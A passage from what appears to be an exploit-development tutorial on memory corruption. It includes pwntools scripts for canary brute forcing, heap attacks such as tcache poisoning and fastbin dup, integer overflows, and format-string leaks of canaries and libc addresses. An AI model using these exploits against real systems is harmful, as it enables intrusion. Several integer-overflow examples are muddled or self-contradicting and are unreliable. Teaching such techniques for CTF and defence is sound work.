# Brute force byte-by-byte

def check_byte(payload):
    p = remote('target', 1337)
    p.send(payload)
    response = p.recvall(timeout=1)
    p.close()
    return b"overflow" not in response  # Adjust detection

offset = 112
canary = b"\x00"  # Null byte is always first (little-endian)

# Brute force 3 remaining bytes
for i in range(3):
    for byte in range(256):
        test_payload = b"A" * offset + canary + bytes([byte])
        if check_byte(test_payload):
            canary += bytes([byte])
            log.info(f"Found byte {i+1}: {hex(byte)}")
            break

log.success(f"Full canary: {canary.hex()}")
```

**Bypass Method 3: Overwrite __stack_chk_fail GOT Entry** [Requires writable GOT, covered in GOT overwrite section]

#### Partial Overwrite (PIE/ASLR Enabled)

**Concept:** Overwrite only lower bytes of return address to redirect within same binary, avoiding ASLR.

```python
#!/usr/bin/env python3
from pwn import *

# PIE binary base randomized: 0x555555554000 (example)
# win() function at: base + 0x1234
# Only overwrite lower 2 bytes to change offset

binary_path = './pie_binary'
elf = ELF(binary_path)

offset = 120
win_offset = 0x1234  # Offset within binary

# Partial overwrite (only lower 2 bytes)
# Assumes return address already points within binary
payload = b"A" * offset
payload += p16(win_offset)  # Only overwrite lower 2 bytes

p = process(binary_path)
p.sendline(payload)
p.interactive()
```

**Limitations:**

- Only works if target address is within 64KB range
- May require multiple attempts due to ASLR randomization of higher bytes
- Success rate: 1/16 (4-bit entropy remaining in page offset)

### Stack Overflow Debugging Workflow

**Step-by-Step Analysis:**

```bash
# 1. Identify vulnerability
objdump -d ./binary -M intel | grep 'call.*strcpy'

# 2. Calculate offset
gdb ./binary
pattern create 300
run $(pattern create 300)
# Note crash address
pattern offset 0x62616165  # Example crash EIP

# 3. Verify control
run $(python3 -c "print('A'*112 + 'BBBB')")
# Check if EIP = 0x42424242

# 4. Find shellcode location
break vulnerable_function
run AAAA
x/gx $rsp  # Note stack address
# Or use environment variable for shellcode location

# 5. Check protections
checksec ./binary
cat /proc/sys/kernel/randomize_va_space

# 6. Develop exploit
# Based on protections: direct shellcode, ret2libc, ROP, etc.
```

**Common Issues and Solutions:**

|Issue|Cause|Solution|
|---|---|---|
|Segfault at 0x41414141|Successful EIP overwrite|Calculate correct offset|
|Segfault at random address|Partial overwrite|Adjust payload length|
|Stack canary detected|SSP enabled|Leak/brute force canary|
|Illegal instruction|Jumping to data|Check NX, use code reuse|
|No crash|Insufficient overflow|Increase payload size|

## Heap-Based Buffer Overflow

### Heap Memory Structure (ptmalloc2/glibc)

**Chunk Metadata:**

```c
struct malloc_chunk {
    size_t prev_size;  // Size of previous chunk (if free)
    size_t size;       // Size of this chunk + flags
    // User data starts here (returned by malloc)
    
    // If free:
    struct malloc_chunk *fd;  // Forward pointer (next free chunk)
    struct malloc_chunk *bk;  // Backward pointer (prev free chunk)
};
```

**Chunk Layout in Memory:**

```
Allocated Chunk:
┌──────────────┐
│ prev_size    │ (only used if prev chunk is free)
├──────────────┤
│ size | AMP   │ A=arena, M=mmap, P=prev_in_use
├──────────────┤ ← Pointer returned by malloc
│ User data    │
│ ...          │
└──────────────┘

Free Chunk:
┌──────────────┐
│ prev_size    │
├──────────────┤
│ size | AMP   │
├──────────────┤
│ fd (forward) │ → Next free chunk
├──────────────┤
│ bk (backward)│ → Prev free chunk
├──────────────┤
│ Unused space │
└──────────────┘
```

**Size Field Flags (3 LSBs):**

- **P (0x1)**: PREV_INUSE - Previous chunk is in use
- **M (0x2)**: IS_MMAPPED - Chunk allocated via mmap
- **A (0x4)**: NON_MAIN_ARENA - Chunk from non-main arena

### Heap Inspection Tools

```bash
# pwndbg heap commands
heap
heap chunks           # Show all chunks
heap bins             # Show free bins
heap arenas           # Show arena info

# GEF heap commands
heap chunks
heap bins fast
heap bins unsorted
heap bins small
heap bins large

# Manual inspection in GDB
info proc mappings | grep heap
x/100gx 0x555555559000  # Examine heap memory

# Visualize chunk structure
x/4gx chunk_addr       # View prev_size, size, fd, bk
p *(struct malloc_chunk *)chunk_addr

# Trace allocations with ltrace
ltrace -e malloc+calloc+realloc+free ./binary
```

### Heap Overflow Vulnerability

**Vulnerable Code Example:**

```c
#include <stdlib.h>
#include <string.h>

int main() {
    char *chunk1 = malloc(100);
    char *chunk2 = malloc(100);
    
    // Vulnerable: no bounds checking
    strcpy(chunk1, user_input);  // Can overflow into chunk2
    
    free(chunk1);
    free(chunk2);
    return 0;
}
```

**Memory Layout:**

```
Heap Memory:
┌─────────────────┐
│ prev_size       │
├─────────────────┤
│ size=0x70 |P=1  │
├─────────────────┤ ← chunk1 (user pointer)
│ User data (100) │
│ [OVERFLOW HERE] │
├─────────────────┤
│ prev_size       │ ← Can overwrite this
├─────────────────┤
│ size            │ ← And this (chunk2 metadata)
├─────────────────┤ ← chunk2
│ User data       │
└─────────────────┘
```

### Heap Exploitation Techniques

#### Technique 1: Unlink Exploit (Classic)

**Concept:** Corrupt free chunk metadata to achieve arbitrary write when chunk is unlinked from free list.

**Unlink Macro (Simplified):**

```c
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;  // *(FD + 12) = BK
    BK->fd = FD;  // *(BK + 8) = FD
}
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# Goal: Write shellcode_addr to GOT entry

target_got = 0x804b028  # GOT entry to overwrite
shellcode_addr = 0x804c100

# Craft fake chunk
# fd = target_got - 12
# bk = shellcode_addr

fake_fd = target_got - 12
fake_bk = shellcode_addr

# Build overflow payload
payload = p32(0)  # prev_size
payload += p32(0x41)  # size (must have P=0 to trigger unlink)
payload += p32(fake_fd)  # fd
payload += p32(fake_bk)  # bk
payload += b"A" * (100 - len(payload))

# Trigger overflow and free
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

**Modern Protections (glibc 2.3.4+):**

```c
// Unlink now has safety checks:
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
    malloc_printerr("corrupted double-linked list");
```

**Bypass:** Use House of Spirit, House of Lore, or other techniques.

#### Technique 2: House of Spirit

**Concept:** Force `free()` to operate on a fake chunk we control (e.g., on stack or in writable memory).

**Requirements:**

1. Control over pointer passed to `free()`
2. Ability to craft fake chunk with valid metadata
3. Target region treated as valid heap chunk

**Example:**

```c
// Vulnerable code
char *ptr = input;  // User controls this pointer
free(ptr);  // Will free wherever ptr points
```

**Exploit:**

```python
#!/usr/bin/env python3
from pwn import *

# Create fake chunk on stack (or writable memory)
fake_chunk_addr = 0xbffff100

# Fake chunk structure
fake_chunk = p32(0)  # prev_size
fake_chunk += p32(0x41)  # size (fastbin size, P=1)
fake_chunk += b"A" * 56  # padding to size

# Next chunk (for validation)
fake_chunk += p32(0)  # prev_size of next
fake_chunk += p32(0x41)  # size of next (P=1)

# Write fake chunk to controlled memory
# Then trigger free(fake_chunk_addr + 8)

# After free, fake chunk enters fastbin
# Next malloc(0x38) returns our controlled address
```

**Fastbin Size Requirements:**

- Size must be within fastbin range: 16-80 bytes (32-bit) or 32-128 bytes (64-bit)
- Next chunk size must also be valid

#### Technique 3: Fastbin Dup (Double Free)

**Concept:** Free same chunk twice to corrupt fastbin linked list, enabling arbitrary address allocation.

**Vulnerable Pattern:**

```c
char *a = malloc(8);
char *b = malloc(8);

free(a);
free(b);
free(a);  // Double free - same chunk freed twice
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Allocate chunks
p.sendline(b"alloc")  # chunk A
p.sendline(b"alloc")  # chunk B

# Double free
p.sendline(b"free 0")  # free A
p.sendline(b"free 1")  # free B
p.sendline(b"free 0")  # free A again

# Fastbin now: A -> B -> A (circular)

# Allocate and write target address
target_addr = 0x601040 - 8  # -8 for size field
p.sendline(b"alloc")
p.send(p64(target_addr))

# Now fastbin: B -> A -> target_addr

p.sendline(b"alloc")  # Gets B
p.sendline(b"alloc")  # Gets A
p.sendline(b"alloc")  # Gets target_addr!

# Write to target_addr
p.send(shellcode)
p.interactive()
```

**Modern Protection (glibc 2.26+):** tcache introduced, which has weaker checks. Double-free in tcache is easier:

```python
# tcache double free (no intermediate free needed)
free(a)
free(a)  # Works directly in tcache
```

#### Technique 4: Tcache Poisoning

**Tcache Structure (glibc 2.26+):**

- Per-thread cache for chunks
- 64 bins (one per size class)
- 7 chunks max per bin
- Minimal security checks

**Tcache Entry:**

```c
typedef struct tcache_entry {
    struct tcache_entry *next;  // Only stores forward pointer
} tcache_entry;
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
p = process('./tcache_vuln')

# Allocate and free to populate tcache
p.sendline(b"malloc 100")  # idx 0
p.sendline(b"free 0")

# Overflow to overwrite tcache->next
target = 0x601060
payload = b"A" * 100  # Fill chunk
payload += p64(0)  # prev_size of next chunk
payload += p64(0x71)  # size of next chunk
payload += p64(target)  # Overwrite fd to target

p.sendline(b"malloc 200")
p.send(payload)

# Next two allocations
p.sendline(b"malloc 100")  # Returns original chunk
p.sendline(b"malloc 100")  # Returns target address!

p.sendline(p64(0xdeadbeef))  # Write to target
p.interactive()
```

#### Technique 5: Unsorted Bin Attack

**Concept:** Corrupt unsorted bin to write large value (libc address) to arbitrary location.

**Unsorted Bin:**

- Holds recently freed chunks
- Double-linked list
- Chunks sorted into appropriate bins when allocated

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# Allocate large chunks (not fastbin)
p.sendline(b"malloc 256")  # chunk A
p.sendline(b"malloc 256")  # chunk B
p.sendline(b"malloc 256")  # guard chunk

# Free A to unsorted bin
p.sendline(b"free 0")

# Overflow into A's metadata
# Overwrite bk to (target - 16)
target = 0x601060  # e.g., global_max_fast for exploitation
payload = b"A" * 256
payload += p64(0)  # prev_size
payload += p64(0x111)  # size
payload += p64(0)  # fd (keep original)
payload += p64(target - 16)  # bk = target - 16

p.sendline(b"malloc 512")
p.send(payload)

# Trigger unsorted bin processing
p.sendline(b"malloc 256")

# Now target contains main_arena address
# Can be used for:
# 1. Leak libc base
# 2. Corrupt global_max_fast for house of force
```

### Heap Exploitation Workflow

**1. Vulnerability Discovery:**

```bash
# Static analysis
objdump -d ./binary -M intel | grep 'call.*<\(strcpy\|read\)@plt>'

# Dynamic analysis with ASAN (Address Sanitizer)
gcc -fsanitize=address -g vuln.c -o vuln_asan
./vuln_asan
# ASAN will report heap overflow with detailed info

# Manual testing
gdb ./binary
break malloc
commands
  x/4gx $rax  # Print allocated chunk
  continue
end
run
```

**2. Heap Layout Analysis:**

```bash
# In pwndbg
heap chunks
# Identify adjacent chunks and sizes

# Track allocations
heap trace
# Shows allocation/free sequence

# Check bins
heap bins
# Identify which bins are populated
```

**3. Determine Exploitation Strategy:**

```
┌─────────────────────────┬──────────────────────────┐
│ Scenario                │ Technique                │
├─────────────────────────┼──────────────────────────┤
│ Small overflow (8-16b)  │ Chunk consolidation      │
│ Control fd/bk           │ Unlink (if old glibc)    │
│ Control free() pointer  │ House of Spirit          │
│ Double free possible    │ Fastbin dup / Tcache dup │
│ Large overflow          │ Poison tcache/fastbin    │
│ Unsorted bin available  │ Unsorted bin attack      │
│ Write-after-free        │ Use-after-free           │
└─────────────────────────┴──────────────────────────┘
```

**4. Primitive Building:**

```python
# Common primitives to achieve:

# Arbitrary read
def leak(addr):
    # Allocate chunk at addr-8
    # Read size field + user data

# Arbitrary write
def write(addr, value):
    # Poison fastbin/tcache to return addr
    # Write value via malloc'd pointer

# Code execution
def execute_shellcode(shellcode_addr):
    # Overwrite __malloc_hook or __free_hook
    # Trigger malloc/free to execute shellcode
```

### Heap Exploitation Tools and Commands

**pwndbg Heap Commands:**

```bash
heap                    # Heap status overview
heap chunks             # List all chunks
heap bins               # Show all bins (fast, tcache, unsorted, small, large)
heap arenas             # Arena information
heap trace              # Trace allocations/frees

# Specific bin inspection
fastbins                # Show fastbin chains
tcachebins              # Show tcache chains (glibc 2.26+)
unsortedbin             # Show unsorted bin
smallbins               # Show small bins
largebins               # Show large bins

# Chunk inspection
x/4gx chunk_addr        # View chunk metadata
dq chunk_addr           # Display quadwords

# Find allocations
search -t string "pattern"
search -t qword 0x401234
```

**GEF Heap Commands:**

```bash
heap chunks
heap bins fast
heap bins tcache
heap bins unsorted
heap bins small
heap bins large

heap arenas
heap set-arena 0x7ffff7dd2b20  # Switch arena

# Analysis
heap-analysis-helper    # Automated heap analysis
```

**Villoc (Heap Visualization):**

```bash
# Install
pip install villoc

# Generate HTML visualization
ltrace -e malloc+calloc+realloc+free -o trace.txt ./binary
villoc trace.txt > heap.html
firefox heap.html
```

**Heap Debugging Script:**

```python
#!/usr/bin/env python3
# Save as heap_debug.py
import gdb

class HeapDump(gdb.Command):
    def __init__(self):
        super(HeapDump, self).__init__("heap-dump", gdb.COMMAND_DATA)
    
    def invoke(self, arg, from_tty):
        # Get heap base
        mappings = gdb.execute("info proc mappings", to_string=True)
        for line in mappings.split('\n'):
            if '[heap]' in line:
                heap_base = int(line.split()[0], 16)
                break
        
        # Dump chunks
        addr = heap_base
        for i in range(20):
            prev_size = gdb.execute(f"x/gx {addr}", to_string=True)
            size = gdb.execute(f"x/gx {addr+8}", to_string=True)
            print(f"Chunk {i}: {hex(addr)}")
            print(f"  prev_size: {prev_size.strip()}")
            print(f"  size: {size.strip()}")
            
            size_val = int(size.split()[-1], 16) & ~7
            addr += size_val

HeapDump()

# Usage in GDB:
# source heap_debug.py
# heap-dump
```

## Integer Overflow/Underflow

### Vulnerability Mechanics

**Integer Overflow:** Occurs when arithmetic operation produces result larger than maximum representable value.

```c
// Signed 32-bit range: -2,147,483,648 to 2,147,483,647
int max = 2147483647;
int overflow = max + 1;  // Wraps to -2,147,483,648

// Unsigned 32-bit range: 0 to 4,294,967,295
unsigned int umax = 4294967295;
unsigned int uoverflow = umax + 1;  // Wraps to 0
```

**Integer Underflow:**

```c
unsigned int value = 0;
unsigned int underflow = value - 1;  // Wraps to 4,294,967,295

int signed_val = -2147483648;
int signed_underflow = signed_val - 1;  // Wraps to 2,147,483,647
```

### Vulnerable Code Patterns

**Pattern 1: Size Calculation Overflow**

```c
void vulnerable(unsigned int len) {
    unsigned int total_size = len + 16;  // Header size
    char *buffer = malloc(total_size);
    
    // If len = 0xFFFFFFF0 (4,294,967,280)
    // total_size = 0xFFFFFFF0 + 16 = 0x00000000 (overflow!)
    // malloc(0) or malloc(small_value)
    // Later operations expect much larger buffer
    
    memcpy(buffer, user_data, len);  // Heap overflow!
}
```

**Pattern 2: Buffer Size Check Bypass**

```c
void vulnerable(unsigned int count) {
    if (count > 1024) {
        return;  // Safety check
    }
    
    unsigned int total = count * sizeof(int);  // Overflow here!
    
    // If count = 0x40000001 (1,073,741,825)
    // total = 0x40000001 * 4 = 0x00000004 (overflow!)
    // Passes check but allocates tiny buffer
    
    int *array = malloc(total);
    for (int i = 0; i < count; i++) {
        array[i] = get_value(i);  // Heap overflow! 
    }
}

````

**Pattern 3: Signed/Unsigned Confusion**
```c
void vulnerable(int size) {
    if (size > 1024) {
        return;  // Check for too large
    }
    
    // size can be negative!
    // If size = -1, passes check
    char *buffer = malloc(size);  // malloc((size_t)-1) = huge allocation
    
    // Or worse:
    if (size < 0) return;
    
    unsigned int usize = (unsigned int)size;
    // If size = 0x7FFFFFFF + 1 after operations
    // Becomes 0x80000000 (negative as signed)
    // But 2,147,483,648 as unsigned
}
````

**Pattern 4: Width Conversion**

```c
void vulnerable(short user_size) {
    unsigned int size = (unsigned int)user_size;
    
    // If user_size = -1 (0xFFFF as short)
    // size = 0x0000FFFF (65,535) after zero-extension
    // BUT if cast is signed first:
    // int temp = (int)user_size; // 0xFFFFFFFF (-1)
    // unsigned int size = (unsigned int)temp; // 0xFFFFFFFF
    
    char *buffer = malloc(size);
}
```

### Detection and Analysis

**Static Analysis:**

```bash
# Find arithmetic operations on user input
grep -rn "malloc.*(" . | grep -E "(\+|\*)"

# Look for size calculations
grep -rn "sizeof" . | grep -E "(\+|\*)"

# Check type conversions
grep -rn "unsigned\|signed" .

# Automated tools
cppcheck --enable=all ./source.c
# Looks for: "Signed integer overflow" and similar

# Clang static analyzer
scan-build gcc -o binary source.c
```

**Dynamic Detection with GDB:**

```bash
gdb ./binary

# Break at suspicious arithmetic
break source.c:42

# Watch for overflow in specific variable
watch size_variable

# Check values before/after operation
print/x size_before
next
print/x size_after

# Detect unexpected wrapping
# If size_after < size_before on addition → overflow
```

**Compiler Sanitizers:**

```bash
# Compile with UndefinedBehaviorSanitizer (UBSan)
gcc -fsanitize=undefined -g source.c -o binary_ubsan
./binary_ubsan

# Output will show:
# source.c:42:15: runtime error: signed integer overflow: 
# 2147483647 + 1 cannot be represented in type 'int'

# Integer sanitizer (catches unsigned too)
gcc -fsanitize=integer -g source.c -o binary_intsan
./binary_intsan
```

### Exploitation Techniques

#### Technique 1: Allocation Size Bypass

**Vulnerable Code:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable(unsigned int count) {
    if (count > 256) {
        puts("Too many items!");
        return;
    }
    
    unsigned int total_size = count * 16;  // Each item 16 bytes
    char *buffer = malloc(total_size);
    
    for (int i = 0; i < count; i++) {
        memcpy(buffer + (i * 16), get_data(i), 16);
    }
    
    free(buffer);
}
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# Calculate overflow value
# Want total_size to wrap to small value
# count * 16 = 0x100000000 + small_value
# count = (0x100000000 + small_value) / 16

# Example: Make total_size = 16 (allocate only 1 entry)
# but count passes the check
# count * 16 ≡ 16 (mod 2^32)
# count * 16 = 0x100000010
# count = 0x10000001 (268,435,457)

count = 0x10000001  # 268,435,457 < not checked properly

# However, count > 256 check will fail
# Need to find: count * 16 wraps, but count <= 256?
# Not possible in this case due to check placement

# Better target: If check was on total_size:
# if (total_size > 4096) return;
# Then: count = 0x10000001 works!
# total_size = 0x10000001 * 16 = 0x10 (16 bytes)
# Passes check, allocates 16 bytes
# But loop writes 268,435,457 * 16 bytes! (massive overflow)

p = process('./vulnerable')
p.sendline(str(count).encode())

# Now send data for each "item"
for i in range(100):  # Don't send all, just enough to corrupt
    p.send(b"A" * 16)

p.interactive()
```

#### Technique 2: Integer Underflow for Large Allocation

**Vulnerable Code:**

```c
void vulnerable(unsigned int size) {
    if (size < 16 || size > 1024) {
        return;  // Size check
    }
    
    unsigned int buf_size = size - 16;  // Reserve 16 for header
    char *buffer = malloc(buf_size);
    
    memcpy(buffer, user_data, size);  // Copy full size!
}
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# If size = 15:
# Fails check (size < 16)

# If size = 16:
# buf_size = 16 - 16 = 0
# malloc(0) may return small chunk or NULL
# memcpy with size=16 causes overflow

# Better: If we can control size as signed int misinterpreted:
# size = -1 (0xFFFFFFFF)
# Check: -1 < 16? (interpreted as signed: YES, fail)
# Check: 0xFFFFFFFF > 1024? (interpreted as unsigned: YES, fail)

# The vulnerability is in the subtraction:
size = 16  # Minimum allowed
# buf_size = 0, but memcpy uses original size

p = process('./vulnerable')
p.sendline(b"16")  # Size parameter

# Send payload that overflows the 0-byte buffer
payload = b"A" * 16  # Header overwrite
payload += p64(0xdeadbeef)  # Overwrite adjacent data

p.send(payload)
p.interactive()
```

#### Technique 3: Signed Integer Overflow for Check Bypass

**Vulnerable Code:**

```c
int read_data(int fd, int size) {
    if (size <= 0 || size > MAX_SIZE) {
        return -1;
    }
    
    char *buffer = malloc(size);
    int total = 0;
    
    while (total < size) {
        int n = read(fd, buffer + total, size - total);
        if (n <= 0) break;
        total += n;  // Integer overflow here!
    }
    
    return total;
}
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# If we can control the data rate:
# 1. Pass valid size (e.g., 1024)
# 2. Send data in chunks such that total overflows
# 3. After overflow, total becomes negative
# 4. Loop continues: total < size is true again
# 5. Continue writing past buffer end

# Example:
# size = 1024
# total starts at 0
# Read 1024 bytes: total = 1024 (loop exits normally)

# But with careful timing:
# Read 2147483647 bytes: total = 2147483647
# Read 1 more byte: total = -2147483648 (overflow!)
# Check: -2147483648 < 1024? YES
# Continue reading into overflowed buffer

# This is difficult to exploit in practice
# Better used in contexts where total is used for indexing

p = remote('target', 1337)
p.send(b"1024\n")  # Size

# Send data causing overflow (theoretical)
payload = b"A" * 2147483648  # Massive payload
p.send(payload)

p.interactive()
```

#### Technique 4: Type Confusion Exploitation

**Vulnerable Code:**

```c
void vulnerable(short length) {
    unsigned int size;
    
    if (length < 0) {
        return;  // Negative check
    }
    
    size = length;  // Sign extension or zero extension?
    char *buffer = malloc(size);
    
    // Read user data
    read(0, buffer, length);  // Length used as size_t here
}
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# Key: How is short converted to unsigned int?

# Case 1: Zero extension (typical for unsigned)
# length = 0x7FFF (32,767)
# size = 0x00007FFF (32,767)
# Works as expected

# Case 2: Length misinterpreted in read()
# If read() casts length to size_t:
# length = 0xFFFF (-1 as signed short, 65,535 as unsigned)
# After passing check (if implementation bug)
# size = 0x0000FFFF (65,535) if zero-extended
# BUT read((size_t)length) might interpret differently

# In x64, length passed in register (EDI typically)
# If caller zero-extends but read() sign-extends:

# Practical exploitation:
length = 0xFFFF  # -1 as signed short

p = process('./vulnerable')
p.sendline(str(length).encode())

# If size is small but read() uses large length:
payload = b"A" * 65535  # Overflow
p.send(payload)

p.interactive()
```

### Practical Integer Overflow CTF Examples

**Example 1: Array Index Overflow**

```c
void vuln(unsigned int index) {
    int array[256];
    
    if (index >= 256) {
        return;
    }
    
    // Vulnerable: index + offset might overflow
    unsigned int offset = get_user_offset();
    unsigned int final_index = index + offset;
    
    // No check on final_index!
    array[final_index] = get_user_value();
}
```

**Exploit:**

```python
#!/usr/bin/env python3
from pwn import *

# Goal: Write to saved return address on stack

# array[256] is at RBP - 1024 (example)
# Saved RIP at RBP + 8
# Distance: 1032 / 4 = 258 array entries

# But index must be < 256
# Solution: overflow final_index calculation

index = 0  # Passes check
offset = 258  # User-controlled
# final_index = 0 + 258 = 258 (no overflow here)

# Need different approach:
# If we can make offset wrap:
# index = 255
# offset = 0xFFFFFFFF - 255 + 258 = 0xFFFFFF03
# final_index = 255 + 0xFFFFFF03 = 0x100000002 (overflow!)
# But this is huge, not useful

# Better: If offset is signed int cast to unsigned
# offset = -1 (0xFFFFFFFF)
# final_index = 255 + 0xFFFFFFFF = 0x1000000FE
# Still problematic

# Realistic: Target is within reachable range
# index = 254, offset = 4
# Write to array[258] which is past array bounds

p = process('./vulnerable')
p.sendline(b"254")  # index
p.sendline(b"4")    # offset
p.sendline(p32(0x41414141))  # value to write

p.interactive()
```

**Example 2: Memory Allocation Size**

```c
struct packet {
    unsigned short count;
    char data[];
};

void process_packet(struct packet *pkt) {
    unsigned int total_size = sizeof(struct packet) + pkt->count;
    struct packet *copy = malloc(total_size);
    
    memcpy(copy, pkt, total_size);
    // Process copy...
    free(copy);
}
```

**Exploit:**

```python
#!/usr/bin/env python3
from pwn import *

# sizeof(struct packet) = 2 bytes (just the count field)
# If count = 0xFFFE:
# total_size = 2 + 0xFFFE = 0x10000 (65,536 bytes) - OK

# If count = 0xFFFF:
# total_size = 2 + 0xFFFF = 0x10001 (65,537 bytes) - OK

# But if count is used in other calculations:
# allocation = count * item_size + header
# This could overflow

# For this specific case:
# count = 0xFFFF makes total_size = 0x10001
# If we control packet content and make it larger:

count = 0xFFFF

packet = p16(count)  # count field
packet += b"A" * 65535  # data field

# total_size calculation seems fine, but if there's
# a secondary calculation like:
# buffer_size = pkt->count + extra_space
# And buffer_size overflows, we get heap corruption

p = process('./vulnerable')
p.send(packet)
p.interactive()
```

### Integer Overflow Prevention and Bypass

**Common Mitigations:**

1. **Compiler Checks:**

```c
// GCC built-in overflow checking
bool __builtin_add_overflow(type1 a, type2 b, type3 *result);
bool __builtin_mul_overflow(type1 a, type2 b, type3 *result);

// Example:
unsigned int safe_multiply(unsigned int a, unsigned int b) {
    unsigned int result;
    if (__builtin_mul_overflow(a, b, &result)) {
        return 0;  // Overflow detected
    }
    return result;
}
```

2. **Manual Checks:**

```c
// Addition check
if (a > UINT_MAX - b) {
    // Overflow would occur
}

// Multiplication check
if (a != 0 && b > UINT_MAX / a) {
    // Overflow would occur
}
```

**Bypass Strategies:**

```python
# If checks are present, look for:
# 1. TOCTOU (Time-of-Check-Time-of-Use)
# 2. Multiple code paths where one is unchecked
# 3. Complex calculations where intermediate overflows aren't checked
# 4. Type confusion between signed/unsigned
```

### Integer Overflow Detection Script

```python
#!/usr/bin/env python3
"""
Integer overflow fuzzer
"""
from pwn import *

context.log_level = 'error'

def test_value(binary, test_input):
    try:
        p = process(binary, timeout=2)
        p.sendline(str(test_input).encode())
        response = p.recvall(timeout=1)
        p.close()
        return response
    except:
        return b""

# Test boundary values
test_values = [
    0,
    1,
    255,
    256,
    32767,          # INT16_MAX
    32768,          # INT16_MAX + 1
    65535,          # UINT16_MAX
    65536,          # UINT16_MAX + 1
    2147483647,     # INT32_MAX
    2147483648,     # INT32_MAX + 1
    4294967295,     # UINT32_MAX
    -1,
    -2147483648,    # INT32_MIN
]

binary = './vulnerable'

for val in test_values:
    response = test_value(binary, val)
    if b"error" not in response and b"invalid" not in response:
        log.info(f"Interesting value: {val} ({hex(val & 0xFFFFFFFF)})")
```

## Format String Vulnerabilities

### Vulnerability Mechanics

**Core Concept:** User-controlled format string passed to printf-family functions, allowing arbitrary memory read/write through format specifiers.

**Vulnerable Code:**

```c
void vulnerable(char *user_input) {
    printf(user_input);  // VULNERABLE!
    // Should be: printf("%s", user_input);
}

// Other vulnerable functions:
fprintf(file, user_input);
sprintf(buffer, user_input);
snprintf(buffer, size, user_input);
syslog(priority, user_input);
```

**Stack Layout During printf:**

```
High Memory
┌──────────────────┐
│ Return address   │
├──────────────────┤
│ Saved EBP        │
├──────────────────┤
│ user_input ptr   │ ← First parameter to printf
├──────────────────┤ ← ESP at printf entry
│ (saved regs)     │
├──────────────────┤
│ Arg 2 (if any)   │ %1$x reads this
├──────────────────┤
│ Arg 3            │ %2$x reads this
├──────────────────┤
│ Arg 4            │ %3$x reads this
├──────────────────┤
│ Stack data       │ %4$x, %5$x, etc.
└──────────────────┘
```

### Format Specifiers

**Reading Memory:**

```
%x      - Read 4 bytes as hex (32-bit) / 8 bytes (64-bit)
%p      - Read pointer value (platform size)
%s      - Read string from address on stack
%d      - Read as signed integer
%u      - Read as unsigned integer
%lx     - Read 8 bytes as hex (even on 32-bit with long long)
%llx    - Read 8 bytes as hex explicitly

Direct parameter access (CRITICAL):
%3$x    - Read 3rd parameter (skip first 2)
%10$s   - Read 10th parameter as string pointer
```

**Writing Memory:**

```
%n      - Write number of bytes output so far to address on stack (32-bit int)
%hn     - Write 16-bit value (short)
%hhn    - Write 8-bit value (byte)
%ln     - Write 64-bit value (long)
%lln    - Write 64-bit value (long long)

With direct access:
%3$n    - Write to address in 3rd parameter
%7$hn   - Write 16-bit to address in 7th parameter
```

### Exploitation Techniques

#### Technique 1: Information Leak (Stack Dump)

**Goal:** Leak stack contents to find canaries, return addresses, PIE base, libc addresses.

**Basic Stack Dump:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Read first 20 stack values
payload = "%p." * 20
p.sendline(payload)

leak = p.recvline().decode()
values = leak.split('.')

for i, val in enumerate(values[:-1]):
    log.info(f"Stack offset {i+1}: {val}")

p.close()
```

**Direct Parameter Access:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Find offset where our input appears on stack
# Method: Send identifiable pattern
payload = b"AAAA" + b".%p" * 20
p.sendline(payload)

response = p.recvline().decode()
log.info(response)

# Look for 0x41414141 in output
# If found at position 7: our buffer starts at %7$p

# Now we can reference our own buffer content
# Useful for arbitrary read

p.close()
```

**Arbitrary Read:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'  # or 'amd64'

p = process('./vulnerable32')

# Assume our buffer is at stack offset 4
buffer_offset = 4

# Address to read (e.g., GOT entry)
target_addr = 0x0804a018

# Build payload
payload = p32(target_addr)  # Address to read
payload += f"%{buffer_offset}$s".encode()  # Read string at address

p.sendline(payload)

# Response contains string at target_addr
response = p.recvuntil(b'\n')
leaked = u32(response[4:8])  # Skip our address at start

log.success(f"Leaked value: {hex(leaked)}")
p.close()
```

**Leak Canary:**

```bash
# Find canary position
gdb ./binary
break vulnerable_function
run
x/40wx $esp  # Find canary (looks like 0xXXXXXX00)

# Note stack position (e.g., %11$p)
```

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Leak canary at stack offset 11
payload = b"%11$p"
p.sendline(payload)

response = p.recvline().decode().strip()
canary = int(response, 16)

log.success(f"Canary: {hex(canary)}")

# Use in subsequent overflow exploit
p.close()
```

**Leak PIE Base:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

p = process('./pie_binary')
elf = ELF('./pie_binary')

# Find a code pointer on stack (saved RIP or function pointer)
# Typically at specific offset

payload = b"%15$p"  # Example offset
p.sendline(payload)

leaked_addr = int(p.recvline().strip(), 16)
pie_base = leaked_addr - elf.symbols['main']  # If leaked main address

log.success(f"PIE base: {hex(pie_base)}")

p.close()
```

**Leak Libc Base:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')
elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak GOT entry (contains libc address after resolution)
printf_got = elf.got['printf']

# Assuming buffer at offset 6
payload = p64(printf_got)
payload += b"%6$s"

p.sendline(payload)
p.recvuntil(b"s")  # Skip to string output

leaked_printf = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked_printf - libc.symbols['printf']

log.success(f"Libc base: {hex(libc_base)}")

# Calculate system address
system_addr = libc_base + libc.symbols['system']
log.info(f"System: {hex(system_addr)}")

p.close()
```

#### Technique 2: Arbitrary Write with %n

